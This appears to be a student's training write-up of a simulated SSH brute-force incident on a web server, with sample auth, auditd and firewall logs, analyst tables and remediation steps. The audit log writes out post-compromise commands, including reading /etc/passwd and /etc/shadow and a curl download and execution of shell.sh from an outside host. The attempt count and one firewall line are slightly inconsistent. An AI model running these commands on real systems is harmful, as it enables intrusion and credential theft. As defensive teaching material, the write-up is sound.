# Beginner Log Analysis — Nexarion Solutions

**Project Type:** SOC-Style Log Analysis  
**Scenario:** Investigating suspicious activity flagged by Nexarion's SIEM on a Monday morning  
**Security+ Domains:** Threats, Attacks & Vulnerabilities | Operations and Incident Response

---

## Scenario Background

On Monday, March 10, 2025, Nexarion's Splunk SIEM generated an alert at 06:14 AM:

> **Alert:** Multiple failed authentication attempts followed by successful login from unusual geolocation  
> **Asset:** NEXARION-WEB01 (External-facing web application server)  
> **Triggered By:** Correlation rule — "Brute Force Followed by Success"

As the on-call analyst, your job is to investigate the logs, determine what happened, and document your findings.

---

## Log Set 1 — SSH Authentication Log (`/var/log/auth.log`)

```
Mar 10 05:47:12 NEXARION-WEB01 sshd[3821]: Failed password for root from 185.220.101.47 port 54312 ssh2
Mar 10 05:47:14 NEXARION-WEB01 sshd[3821]: Failed password for root from 185.220.101.47 port 54313 ssh2
Mar 10 05:47:16 NEXARION-WEB01 sshd[3821]: Failed password for root from 185.220.101.47 port 54314 ssh2
Mar 10 05:47:19 NEXARION-WEB01 sshd[3821]: Failed password for admin from 185.220.101.47 port 54315 ssh2
Mar 10 05:47:21 NEXARION-WEB01 sshd[3821]: Failed password for admin from 185.220.101.47 port 54316 ssh2
Mar 10 05:47:24 NEXARION-WEB01 sshd[3821]: Failed password for admin from 185.220.101.47 port 54317 ssh2
Mar 10 05:47:26 NEXARION-WEB01 sshd[3821]: Failed password for webadmin from 185.220.101.47 port 54318 ssh2
Mar 10 05:47:29 NEXARION-WEB01 sshd[3821]: Failed password for webadmin from 185.220.101.47 port 54319 ssh2
Mar 10 05:47:31 NEXARION-WEB01 sshd[3821]: Failed password for deploy from 185.220.101.47 port 54320 ssh2
Mar 10 05:47:33 NEXARION-WEB01 sshd[3821]: Failed password for deploy from 185.220.101.47 port 54321 ssh2
Mar 10 05:47:35 NEXARION-WEB01 sshd[3821]: Failed password for deploy from 185.220.101.47 port 54322 ssh2
Mar 10 05:47:38 NEXARION-WEB01 sshd[3821]: Failed password for deploy from 185.220.101.47 port 54323 ssh2
Mar 10 05:47:41 NEXARION-WEB01 sshd[3821]: Failed password for nxadmin from 185.220.101.47 port 54324 ssh2
Mar 10 05:47:44 NEXARION-WEB01 sshd[3821]: Failed password for nxadmin from 185.220.101.47 port 54325 ssh2
Mar 10 05:47:47 NEXARION-WEB01 sshd[3821]: Failed password for nxadmin from 185.220.101.47 port 54326 ssh2
Mar 10 05:48:02 NEXARION-WEB01 sshd[3821]: Failed password for nxadmin from 185.220.101.47 port 54327 ssh2
Mar 10 05:48:05 NEXARION-WEB01 sshd[3821]: Failed password for nxadmin from 185.220.101.47 port 54328 ssh2
Mar 10 05:48:09 NEXARION-WEB01 sshd[3821]: Failed password for svcaccount from 185.220.101.47 port 54329 ssh2
Mar 10 05:48:13 NEXARION-WEB01 sshd[3821]: Accepted password for svcaccount from 185.220.101.47 port 54330 ssh2
Mar 10 05:48:13 NEXARION-WEB01 sshd[3821]: pam_unix(sshd:session): session opened for user svcaccount by (uid=0)
```

---

## Log Analysis — Auth Log

**Analyst Notes:**

| Observation | Detail |
|-------------|--------|
| Attack type | SSH brute force / credential stuffing |
| Source IP | `185.220.101.47` |
| Attack start time | `05:47:12` |
| Successful login time | `05:48:13` |
| Duration of attack | ~61 seconds |
| Accounts attempted | `root`, `admin`, `webadmin`, `deploy`, `nxadmin`, `svcaccount` |
| Account compromised | `svcaccount` |
| Total failed attempts | 19 before success |

**Key Finding:** The attacker successfully authenticated as `svcaccount` at 05:48:13 using a password. This account should not have been accessible via password authentication — SSH keys only should be enforced. This suggests `svcaccount` was not included in the SSH hardening policy.

**IP Reputation Check (simulated):** `185.220.101.47` is a known Tor exit node IP, commonly used to anonymise attack traffic. This is consistent with an automated brute-force tool.

---

## Log Set 2 — Bash History / Command Log (Post-Login)

The following commands were captured via auditd after the attacker logged in as `svcaccount`:

```
Mar 10 05:48:16 NEXARION-WEB01 audit: EXECVE a0="id"
Mar 10 05:48:16 NEXARION-WEB01 audit: EXECVE a0="whoami"
Mar 10 05:48:17 NEXARION-WEB01 audit: EXECVE a0="uname" a1="-a"
Mar 10 05:48:18 NEXARION-WEB01 audit: EXECVE a0="cat" a1="/etc/passwd"
Mar 10 05:48:20 NEXARION-WEB01 audit: EXECVE a0="cat" a1="/etc/shadow" (PERMISSION DENIED)
Mar 10 05:48:22 NEXARION-WEB01 audit: EXECVE a0="sudo" a1="-l"
Mar 10 05:48:23 NEXARION-WEB01 audit: EXECVE a0="find" a1="/" a2="-perm" a3="-4000" a4="-type" a5="f"
Mar 10 05:48:31 NEXARION-WEB01 audit: EXECVE a0="ls" a1="-la" a2="/var/www/html"
Mar 10 05:48:34 NEXARION-WEB01 audit: EXECVE a0="cat" a1="/var/www/html/config.php"
Mar 10 05:48:36 NEXARION-WEB01 audit: EXECVE a0="curl" a1="-s" a2="http://185.220.101.99/shell.sh" a3="-o" a4="/tmp/shell.sh"
Mar 10 05:48:37 NEXARION-WEB01 audit: EXECVE a0="chmod" a1="+x" a2="/tmp/shell.sh"
Mar 10 05:48:37 NEXARION-WEB01 audit: EXECVE a0="bash" a1="/tmp/shell.sh"
```

---

## Log Analysis — Command Log

**Analyst Notes:**

| Command | What It Means |
|---------|--------------|
| `id` / `whoami` | Attacker confirming which user they are running as |
| `uname -a` | Checking the OS version — looking for known kernel exploits |
| `cat /etc/passwd` | Enumerating all user accounts on the system |
| `cat /etc/shadow` | Attempting to read password hashes — **denied** (good) |
| `sudo -l` | Checking if `svcaccount` has any sudo permissions |
| `find / -perm -4000` | Searching for SUID binaries — used for privilege escalation |
| `ls -la /var/www/html` | Exploring the web application directory |
| `cat /var/www/html/config.php` | **Critical** — likely contains database credentials |
| `curl … shell.sh` | Downloading a shell script from attacker-controlled server |
| `chmod +x` / `bash shell.sh` | Executing the downloaded payload — **this is the malware stage** |

**Key Finding:** The attacker followed a classic post-exploitation enumeration pattern, then downloaded and executed a remote shell script. The reading of `config.php` likely exposed database credentials. The downloaded script likely establishes persistence or a reverse shell.

---

## Log Set 3 — Firewall / Network Log

```
Mar 10 05:48:36 NEXARION-FW01 DENY OUT 10.10.30.22 → 185.220.101.99:80 TCP (blocked by egress rule)
Mar 10 05:48:36 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:80 TCP (rule: allow-web-outbound)
Mar 10 05:48:40 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:4444 TCP
Mar 10 05:48:41 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:4444 TCP
Mar 10 05:48:43 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:4444 TCP
Mar 10 05:49:01 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:4444 TCP
Mar 10 05:49:22 NEXARION-FW01 PERMIT OUT 10.10.30.22 → 185.220.101.99:4444 TCP
```

---

## Log Analysis — Firewall Log

**Analyst Notes:**

| Observation | Detail |
|-------------|--------|
| Source (internal) | `10.10.30.22` — this is NEXARION-WEB01 |
| Destination | `185.220.101.99` — attacker's server |
| Port 80 connection | Used to download `shell.sh` |
| Port 4444 connections | **Classic reverse shell port** — repeated beaconing every ~20 seconds |
| Firewall rule gap | Port 4444 outbound was not blocked by egress rules |

**Key Finding:** The shell script established a reverse shell back to the attacker's server on port 4444. The firewall was not configured to restrict outbound traffic, only inbound. This is a common misconfiguration.

---

## Incident Summary

| Field | Detail |
|-------|--------|
| **Incident Type** | Brute force → system compromise → reverse shell |
| **Affected System** | NEXARION-WEB01 (`10.10.30.22`) |
| **Attack Timeline** | 05:47:12 — 05:48:43 (under 2 minutes from first attempt to reverse shell) |
| **Initial Access** | SSH brute force against `svcaccount` (password auth enabled) |
| **Persistence Method** | Reverse shell via downloaded script |
| **Data at Risk** | Database credentials in `config.php`, user list from `/etc/passwd` |
| **Attacker IP** | `185.220.101.47` / `185.220.101.99` (Tor exit nodes) |
| **Severity** | Critical |

---

## Recommended Immediate Actions

1. Isolate NEXARION-WEB01 from the network immediately
2. Kill any active sessions and processes spawned by `svcaccount`
3. Rotate all credentials found in `config.php`
4. Block outbound connections to `185.220.101.0/24` at the firewall
5. Disable `svcaccount` and enforce SSH key-only authentication for all accounts
6. Investigate whether the database was accessed using the leaked credentials
7. Audit all other servers for the same SSH misconfiguration

---

## Firewall Rule Recommendations

| Rule | Action | Justification |
|------|--------|--------------|
| Block outbound on non-standard ports (e.g., 4444, 1337, 9001) | Deny | Reduces reverse shell risk |
| Implement default-deny egress policy | Deny all, permit by exception | Limits C2 and data exfiltration |
| Restrict SSH to management VLAN only | Permit from 10.10.10.0/24 only | Removes public internet SSH access |

---

## Security+ Concepts Demonstrated

- **Brute force attack** — repeated login attempts against SSH
- **Credential stuffing** — trying common usernames like `admin`, `root`, `deploy`
- **Post-exploitation enumeration** — `id`, `whoami`, `sudo -l`, SUID search
- **Reverse shell** — attacker-initiated connection back through the firewall
- **Log analysis** — correlating auth, command, and network logs to reconstruct an attack
- **Indicators of Compromise (IOCs)** — suspicious IPs, unusual outbound traffic, known-bad commands
- **Egress filtering** — why outbound firewall rules matter as much as inbound

---

## Reflection

This project was one of the most engaging for me. Reading through the logs like a story — watching the attacker go from brute-forcing accounts to downloading a shell — made security feel very real. I learned that attacks move fast; this entire compromise happened in under 2 minutes. I also learned that logs from different sources (auth, audit, firewall) need to be correlated together to get the full picture — no single log tells the whole story. The firewall log showing the reverse shell beaconing on port 4444 was the moment everything clicked for me.
